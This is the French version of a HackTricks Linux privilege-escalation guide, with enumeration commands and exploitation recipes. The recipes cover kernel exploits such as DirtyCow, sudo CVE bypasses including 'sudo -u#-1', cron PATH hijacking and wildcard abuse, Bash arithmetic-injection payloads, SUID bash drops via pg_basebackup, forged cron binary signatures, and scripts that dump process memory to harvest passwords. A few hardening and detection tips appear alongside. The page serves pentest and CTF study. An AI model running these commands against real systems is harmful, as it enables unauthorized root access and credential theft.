# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informations système

### Informations sur l'OS

Commençons par recueillir des informations sur l'OS en cours d'exécution.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Si vous **avez les permissions d'écriture sur n'importe quel dossier contenu dans la variable `PATH`** vous pourriez être capable de détourner certaines bibliothèques ou binaires :
```bash
echo $PATH
```
### Infos d'environnement

Des informations intéressantes, des mots de passe ou des clés API dans les variables d'environnement ?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Vérifiez la version du kernel et s'il existe un exploit pouvant être utilisé pour escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Vous pouvez trouver une bonne liste de kernels vulnérables et quelques **compiled exploits** ici: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) et [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
D'autres sites où vous pouvez trouver des **compiled exploits** : [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Pour extraire toutes les versions de kernel vulnérables de ce site, vous pouvez faire :
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Les outils qui peuvent aider à rechercher des exploits du kernel sont :

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (exécuter SUR la victime, vérifie uniquement les exploits pour le kernel 2.x)

Recherchez toujours **la version du kernel sur Google**, peut‑être que votre version du kernel est mentionnée dans un exploit kernel et vous serez alors sûr que cet exploit est valide.

Techniques supplémentaires d'exploitation du kernel :

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Version de Sudo

Basé sur les versions vulnérables de Sudo qui apparaissent dans :
```bash
searchsploit sudo
```
Vous pouvez vérifier si la version de sudo est vulnérable en utilisant ce grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Les versions de Sudo antérieures à 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permettent aux utilisateurs locaux non privilégiés d'escalader leurs privilèges vers root via l'option sudo `--chroot` lorsque le fichier `/etc/nsswitch.conf` est utilisé depuis un répertoire contrôlé par l'utilisateur.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Avant d'exécuter l'exploit, assurez-vous que votre version de `sudo` est vulnérable et qu'elle prend en charge la fonctionnalité `chroot`.

Pour plus d'informations, consultez l'[vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo avant 1.9.17p1 (plage affectée signalée : **1.8.8–1.9.17**) peut évaluer les règles sudoers basées sur l'hôte en utilisant le **nom d'hôte fourni par l'utilisateur** depuis `sudo -h <host>` au lieu du **nom d'hôte réel**. Si sudoers accorde des privilèges plus larges sur un autre hôte, vous pouvez **spoof** cet hôte localement.

Prérequis:
- Version de sudo vulnérable
- Règles sudoers spécifiques à l'hôte (l'hôte n'est ni le nom d'hôte actuel ni `ALL`)

Exemple de modèle sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploiter en réalisant du spoofing sur l'hôte autorisé:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Si la résolution du nom usurpé bloque, ajoutez-le à `/etc/hosts` ou utilisez un hostname qui apparaît déjà dans les logs/configs pour éviter les requêtes DNS.

#### sudo < v1.8.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg : échec de la vérification de la signature

Consultez **smasher2 box of HTB** pour un **exemple** de la façon dont cette vuln pourrait être exploitée
```bash
dmesg 2>/dev/null | grep "signature"
```
### Plus d'énumération du système
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Énumérer les défenses possibles

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Si vous êtes à l'intérieur d'un container, commencez par la section container-security suivante, puis pivotez vers les pages d'abus spécifiques au runtime :


{{#ref}}
container-security/
{{#endref}}

## Disques

Vérifiez **ce qui est monté et ce qui ne l'est pas**, où et pourquoi. Si quelque chose n'est pas monté, vous pouvez essayer de le monter et vérifier s'il contient des informations privées.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Logiciels utiles

Énumérer les binaries utiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Vérifiez également si **n'importe quel compilateur est installé**. Ceci est utile si vous devez utiliser un kernel exploit, car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une machine similaire)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Logiciels vulnérables installés

Vérifiez la **version des paquets et services installés**. Il se peut qu'il existe une ancienne version de Nagios (par exemple) qui pourrait être exploitée pour escalating privileges…\
Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si vous avez un accès SSH à la machine, vous pouvez aussi utiliser **openVAS** pour vérifier si des logiciels installés sur la machine sont obsolètes ou vulnérables.

> [!NOTE] > _Notez que ces commandes afficheront beaucoup d'informations qui seront pour la plupart inutiles ; il est donc recommandé d'utiliser des applications comme OpenVAS ou similaires pour vérifier si une version de logiciel installée est vulnérable à des exploits connus_

## Processus

Examinez **quels processus** sont exécutés et vérifiez si un processus possède **plus de privilèges qu'il ne devrait** (par exemple un tomcat exécuté par root ?)
```bash
ps aux
ps -ef
top -n 1
```
Vérifiez toujours la présence de [**electron/cef/chromium debuggers** en cours d'exécution — vous pourriez les exploiter pour escalader les privilèges](electron-cef-chromium-debugger-abuse.md). **Linpeas** les détecte en vérifiant le paramètre `--inspect` dans la ligne de commande du processus.\
Vérifiez aussi **vos privilèges sur les binaires des processus**, peut-être pouvez-vous écraser un binaire.

### Chaînes parent-enfant inter-utilisateurs

Un processus enfant s'exécutant sous un **utilisateur différent** de son parent n'est pas automatiquement malveillant, mais constitue un **triage signal** utile. Certaines transitions sont attendues (`root` lançant un service user, login managers créant des processus de session), mais des chaînes inhabituelles peuvent révéler des wrappers, debug helpers, persistence, ou des frontières de confiance d'exécution faibles.

Revue rapide:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Si vous trouvez une chaîne surprenante, inspectez la ligne de commande du parent et tous les fichiers qui influencent son comportement (`config`, `EnvironmentFile`, scripts d'aide, répertoire de travail, arguments écrivables). Dans plusieurs chemins privesc réels, l'enfant lui-même n'était pas modifiable en écriture, mais le **config contrôlé par le parent** ou la chaîne d'aide l'était.

### Deleted executables and deleted-open files

Les artefacts d'exécution sont souvent encore accessibles **après suppression**. Ceci est utile à la fois pour privilege escalation et pour récupérer des preuves d'un processus qui a déjà des fichiers sensibles ouverts.

Recherchez des exécutables supprimés :
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Si `/proc/<PID>/exe` pointe vers `(deleted)`, le processus exécute encore l'ancienne image binaire en mémoire. C'est un fort signal qu'il faut enquêter car :

- l'exécutable supprimé peut contenir des chaînes intéressantes ou des identifiants
- le processus en cours peut encore exposer des descripteurs de fichiers utiles
- un binaire privilégié supprimé peut indiquer une altération récente ou une tentative de nettoyage

Collecter globalement les fichiers supprimés mais encore ouverts :
```bash
lsof +L1
```
Si vous trouvez un descriptor intéressant, récupérez-le directement :
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Ceci est particulièrement précieux lorsqu'un processus a encore ouvert un secret supprimé, un script, un export de base de données, ou un flag file.

### Surveillance des processus

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour surveiller les processus. Cela peut être très utile pour identifier des processus vulnérables exécutés fréquemment ou lorsque certaines conditions sont remplies.

### Mémoire des processus

Certains services d'un serveur sauvegardent des **credentials en clair dans la mémoire**.\
Normalement, vous aurez besoin de **root privileges** pour lire la mémoire des processus appartenant à d'autres utilisateurs, par conséquent cela est généralement plus utile lorsque vous êtes déjà root et souhaitez découvrir davantage de credentials.\
Cependant, rappelez-vous que **en tant qu'utilisateur régulier, vous pouvez lire la mémoire des processus que vous possédez**.

> [!WARNING]
> Notez que de nos jours la plupart des machines **n'autorisent pas ptrace par défaut**, ce qui signifie que vous ne pouvez pas dumper d'autres processus appartenant à votre utilisateur non privilégié.
>
> Le fichier _**/proc/sys/kernel/yama/ptrace_scope**_ contrôle l'accessibilité de ptrace :
>
> - **kernel.yama.ptrace_scope = 0**: tous les processus peuvent être débogués, tant qu'ils ont le même uid. C'est la façon classique dont fonctionnait ptrace.
> - **kernel.yama.ptrace_scope = 1**: seul un processus parent peut être débogué.
> - **kernel.yama.ptrace_scope = 2**: Seul l'admin peut utiliser ptrace, car cela requiert la capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Aucun processus ne peut être tracé avec ptrace. Une fois défini, un reboot est nécessaire pour réactiver ptrace.

#### GDB

Si vous avez accès à la mémoire d'un service FTP (par exemple), vous pouvez récupérer le Heap et rechercher à l'intérieur ses credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Pour un ID de processus donné, **maps montrent comment la mémoire est mappée dans le** espace d'adressage virtuel de ce processus ; elles indiquent également les **permissions de chaque région mappée**. Le fichier pseudo **mem** **expose la mémoire du processus elle-même**. À partir du fichier **maps** nous savons quelles **régions mémoire sont lisibles** et leurs offsets. Nous utilisons ces informations pour **seek into the mem file and dump all readable regions** dans un fichier.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` donne accès à la mémoire **physique** du système, et non à la mémoire virtuelle. L'espace d'adresses virtuelles du kernel peut être accédé en utilisant /dev/kmem.\
Typiquement, `/dev/mem` n'est lisible que par **root** et le groupe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump est une réinvention pour Linux de l'outil classique ProcDump de la suite Sysinternals pour Windows. Disponible sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Outils

Pour dump la mémoire d'un processus, vous pouvez utiliser :

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez manuellement supprimer les exigences root et dump le processus appartenant à votre utilisateur
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root est requis)

### Identifiants depuis la mémoire du processus

#### Exemple manuel

Si vous constatez que le processus d'authentification est en cours d'exécution :
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Vous pouvez dump the process (voir les sections précédentes pour trouver différentes façons de dump the memory of a process) et rechercher des credentials dans la memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

L'outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en clair depuis la mémoire** et depuis certains **fichiers bien connus**. Il nécessite les privilèges root pour fonctionner correctement.

| Fonctionnalité                                    | Nom du processus     |
| ------------------------------------------------- | -------------------- |
| Mot de passe GDM (Kali Desktop, Debian Desktop)   | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Connexions FTP actives)                   | vsftpd               |
| Apache2 (Sessions d'authentification HTTP Basic actives) | apache2      |
| OpenSSH (Sessions SSH actives - utilisation de sudo)     | sshd:         |

#### Recherche Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tâches planifiées/Cron

### Crontab UI (alseambusher) exécuté en tant que root – privesc via planificateur web

Si un panneau web “Crontab UI” (alseambusher/crontab-ui) s'exécute en tant que root et est lié uniquement à loopback, vous pouvez quand même y accéder via SSH local port-forwarding et créer un job privilégié pour escalader.

Chaîne typique
- Découvrir un port accessible uniquement depuis loopback (p.ex., 127.0.0.1:8000) et le realm Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
- Trouver des identifiants dans des artefacts opérationnels :
- Sauvegardes/scripts avec `zip -P <password>`
- Unité systemd exposant `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel et login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Créer un high-priv job et l'exécuter immédiatement (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Utilisez-le :
```bash
/tmp/rootshell -p   # root shell
```
Durcissement
- Ne pas exécuter Crontab UI en tant que root ; confiner à un utilisateur dédié avec des permissions minimales
- Lier l'écoute sur localhost et restreindre en plus l'accès via firewall/VPN ; ne pas réutiliser les mots de passe
- Éviter d'inclure des secrets dans les unit files ; utiliser des secret stores ou un EnvironmentFile accessible uniquement par root
- Activer audit/logging pour les exécutions de jobs à la demande

Vérifiez si un scheduled job est vulnérable. Peut-être pouvez-vous tirer parti d'un script exécuté par root (wildcard vuln ? peut-on modifier des fichiers que root utilise ? utiliser des symlinks ? créer des fichiers spécifiques dans le répertoire que root utilise ?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Si `run-parts` est utilisé, vérifiez quels noms seront réellement exécutés :
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Cela évite les faux positifs. Un répertoire périodique accessible en écriture n'est utile que si le nom de fichier de votre payload correspond aux règles locales de `run-parts`.

### Cron path

Par exemple, dans _/etc/crontab_ vous pouvez trouver le PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Notez que l'utilisateur "user" a des privilèges d'écriture sur /home/user_)

Si, dans ce crontab, l'utilisateur root tente d'exécuter une commande ou un script sans définir le PATH. Par exemple: _\* \* \* \* root overwrite.sh_\
Vous pouvez alors obtenir un shell root en utilisant :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron utilisant un script avec un wildcard (Wildcard Injection)

Si un script exécuté par root contient un “**\***” dans une commande, vous pouvez exploiter cela pour provoquer des comportements inattendus (comme privesc). Exemple:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable (even** _**./\***_ **is not).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash effectue parameter expansion et command substitution avant l'évaluation arithmétique dans ((...)), $((...)) et let. Si un root cron/parser lit des champs de log non fiables et les injecte dans un contexte arithmétique, un attaquant peut insérer une command substitution $(...) qui s'exécute en tant que root lorsque le cron tourne.

- Pourquoi ça marche : Dans Bash, les expansions se produisent dans cet ordre : parameter/variable expansion, command substitution, arithmetic expansion, puis word splitting et pathname expansion. Donc une valeur comme `$(/bin/bash -c 'id > /tmp/pwn')0` est d'abord substituée (exécution de la commande), puis le `0` numérique restant est utilisé pour l'arithmétique afin que le script continue sans erreur.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation : Faire écrire du texte contrôlé par l'attaquant dans le log analysé de sorte que le champ à apparence numérique contienne une command substitution et se termine par un chiffre. Assurez-vous que votre commande n'écrit pas sur stdout (ou la redirigez) pour que l'opération arithmétique reste valide.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **directory where you have full access**, il peut être utile de supprimer ce folder et de **create a symlink folder to another one** qui sert un script que vous contrôlez.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validation des Symlink et gestion de fichiers plus sûre

Lors de la revue de scripts/binaries privilégiés qui lisent ou écrivent des fichiers par chemin, vérifiez comment les liens sont traités :

- `stat()` suit un symlink et renvoie les métadonnées de la cible.
- `lstat()` renvoie les métadonnées du lien lui-même.
- `readlink -f` et `namei -l` aident à résoudre la cible finale et à afficher les permissions de chaque composant du chemin.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Pour defenders/developers, des patterns plus sûrs contre les symlink tricks incluent :

- `O_EXCL` with `O_CREAT` : échouer si le chemin existe déjà (bloque les liens/fichiers pré-créés par un attaquant).
- `openat()` : opérer par rapport à un descripteur de répertoire de confiance.
- `mkstemp()` : créer des fichiers temporaires de façon atomique avec des permissions sécurisées.

### Custom-signed cron binaries with writable payloads
Les blue teams signent parfois des binaires lancés par cron en dumpant une section ELF personnalisée et en faisant un grep d'une chaîne vendor avant de les exécuter en root. Si ce binaire est group-writable (par ex., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) et que vous pouvez leak le matériel de signature, vous pouvez forger la section et détourner la tâche cron :

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

Vous pouvez monitorer les processus pour rechercher ceux qui sont exécutés toutes les 1, 2 ou 5 minutes. Peut‑être pouvez‑vous en tirer avantage pour escalader les privileges.

Par exemple, pour **monitor every 0.1s during 1 minute**, **sort by less executed commands** et supprimer les commandes qui ont été exécutées le plus, vous pouvez faire :
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Vous pouvez aussi utiliser** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (cela va surveiller et lister chaque processus qui démarre).

### Sauvegardes root qui conservent les bits de mode définis par l'attaquant (pg_basebackup)

Si un cron appartenant à root exécute `pg_basebackup` (ou toute copie récursive) sur un répertoire de base de données dans lequel vous pouvez écrire, vous pouvez placer un **SUID/SGID binary** qui sera recopié en tant que **root:root** avec les mêmes bits de mode dans la sortie de la sauvegarde.

Flux de découverte typique (en tant qu'utilisateur DB à faible privilège) :
- Utilisez `pspy` pour repérer un cron root appelant quelque chose comme `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` toutes les minutes.
- Confirmez que le cluster source (p.ex., `/var/lib/postgresql/14/main`) est accessible en écriture par vous et que la destination (`/opt/backups/current`) devient propriété de root après l'exécution du job.

Exploitation:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Ça fonctionne parce que `pg_basebackup` préserve les bits de mode de fichier lors de la copie du cluster ; lorsqu'il est invoqué par root les fichiers de destination héritent **root ownership + attacker-chosen SUID/SGID**. Toute routine privilégiée de sauvegarde/copie similaire qui conserve les permissions et écrit dans un emplacement exécutable est vulnérable.

### Tâches cron invisibles

Il est possible de créer une tâche cron en **mettant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et la tâche cron fonctionnera. Exemple (notez le caractère de retour chariot) :
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Pour détecter ce type d'entrée furtive, inspectez les fichiers cron avec des outils qui exposent les caractères de contrôle :
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Fichiers _.service_ inscriptibles

Vérifiez si vous pouvez écrire un fichier `.service`, si oui, vous **pourrez le modifier** pour qu'il **exécute** votre **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (il se peut que vous deviez attendre que la machine soit redémarrée).\
Par exemple créez votre backdoor dans le fichier .service avec **`ExecStart=/tmp/script.sh`**

### Binaires de service modifiables

Gardez à l'esprit que si vous avez des **permissions d'écriture sur des binaires exécutés par des services**, vous pouvez les modifier pour y placer des backdoors de sorte que lorsque les services seront ré-exécutés, les backdoors seront lancés.

### systemd PATH - Chemins relatifs

Vous pouvez voir le PATH utilisé par **systemd** avec:
```bash
systemctl show-environment
```
Si vous constatez que vous pouvez **écrire** dans l'un des dossiers du chemin, vous pourriez être en mesure d'**escalate privileges**. Vous devez rechercher des **relative paths** utilisés dans les fichiers de configuration des services, comme :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ensuite, créez un **exécutable** portant **le même nom que le binaire correspondant au chemin relatif** à l'intérieur du répertoire PATH de systemd sur lequel vous pouvez écrire, et lorsque le service est amené à exécuter l'action vulnérable (**Start**, **Stop**, **Reload**), votre **backdoor sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter les services, mais vérifiez si vous pouvez utiliser `sudo -l`).

**En savoir plus sur les services avec `man systemd.service`.**

## **Timers**

**Timers** sont des fichiers d'unité systemd dont le nom se termine par `**.timer**` et qui contrôlent des fichiers ou événements `**.service**`. Les **Timers** peuvent être utilisés comme alternative à cron car ils ont un support intégré pour les événements calendrier et les événements monotoniques, et peuvent s'exécuter de manière asynchrone.

Vous pouvez énumérer tous les timers avec:
```bash
systemctl list-timers --all
```
### Timers modifiables

Si vous pouvez modifier un timer, vous pouvez le faire exécuter certaines unités existantes de systemd.unit (comme une `.service` ou une `.target`).
```bash
Unit=backdoor.service
```
Dans la documentation, vous pouvez lire ce qu'est l'unité :

> L'unité à activer lorsque ce timer expire. L'argument est un nom d'unité, dont le suffixe n'est pas ".timer". Si non spécifié, cette valeur par défaut correspond à un service ayant le même nom que l'unité timer, à l'exception du suffixe. (See above.) Il est recommandé que le nom de l'unité activée et le nom de l'unité timer soient identiques, à l'exception du suffixe.

Therefore, to abuse this permission you would need to:

- Trouver une unité systemd (comme une `.service`) qui **exécute un binaire modifiable**
- Trouver une unité systemd qui **exécute un chemin relatif** et pour laquelle vous avez des **privilèges d'écriture** sur le **systemd PATH** (pour usurper cet exécutable)

**Learn more about timers with `man systemd.timer`.**

### **Activation d'un timer**

Pour activer un timer, vous avez besoin des privilèges root et d'exécuter :
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Notez que le **timer** est **activé** en créant un symlink vers celui-ci sur `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permettent la **communication entre processus** sur la même machine ou entre machines dans des modèles client-serveur. Ils utilisent des fichiers descripteurs Unix standard pour la communication inter-machines et sont configurés via des fichiers `.socket`.

Sockets peuvent être configurés en utilisant des fichiers `.socket`.

**Pour en savoir plus sur les sockets, voir `man systemd.socket`.** Dans ce fichier, plusieurs paramètres intéressants peuvent être configurés :

